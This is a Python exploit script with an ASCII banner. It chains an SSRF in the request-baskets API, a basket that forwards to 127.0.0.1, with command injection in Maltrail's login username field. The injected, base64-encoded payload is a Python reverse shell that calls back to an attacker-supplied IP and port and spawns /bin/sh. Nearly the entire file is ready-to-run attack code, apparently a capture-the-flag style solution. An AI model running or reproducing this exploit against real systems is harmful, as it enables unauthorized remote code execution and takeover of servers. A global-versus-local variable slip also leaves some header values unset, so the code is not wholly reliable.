'''
  ██████  ██▓███   ▒█████   ▒█████   ██ ▄█▀ ██▓▓█████  ██▀███  
▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒ ██▄█▒ ▓██▒▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▓███▄░ ▒██▒▒███   ▓██ ░▄█ ▒
  ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░▓██ █▄ ░██░▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░▒██▒ █▄░██░░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▓  ░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░ ▒ ░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░  ▒ ░   ░     ░░   ░ 
      ░               ░ ░      ░ ░  ░  ░    ░     ░  ░   ░     
'''

import sys;
import os;
import base64;
import requests;
import json;

local_ip = None
local_port = None
remote_ip = None
remote_port = None
maltail_url = None
forwarded = None

def main():
	if len(sys.argv) != 6:
		print("Usage: ./exploit.py local_ip local_port remote_ip remote_port basket_name")
		return(-1)
	
	local_ip = sys.argv[1]
	local_port = sys.argv[2]
	remote_ip = sys.argv[3]
	remote_port = sys.argv[4]
	forwarded = sys.argv[5]
 
	request_maltail = f"http://{remote_ip}:{remote_port}/api/baskets/{forwarded}"
	target_url = f"http://{remote_ip}:{remote_port}/{forwarded}/login"

	# exp1: create a basket forwarding maltail
	print("[*] Creating request basket forwarding vulnerable Maltail")
	new_braket(request_maltail)	
	# exp2: malwait username rce
	print("[*] Running exploit on " + str(target_url))
	curl_cmd(local_ip, local_port, target_url)

def curl_cmd(my_ip, my_port, target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)

def new_braket(request_maltail):
    # new a request braket to generate an url -> Maltrail
    headers = {
    "User-Agent": "Mozilla/5.0 Firefox/115.0",
    "Authorization": "null",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": f"http://{remote_ip}:{remote_port}",
    "Referer": f"http://{remote_ip}:{remote_port}/web",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
	}
    
    data = {
    "forward_url": "http://127.0.0.1:80",
    "proxy_response": True,
    "insecure_tls": True,
    "expand_path": True,
    "capacity": 200
	}
    
    resp = requests.post(request_maltail, headers=headers, data=json.dumps(data))

if __name__ == "__main__":
    main()
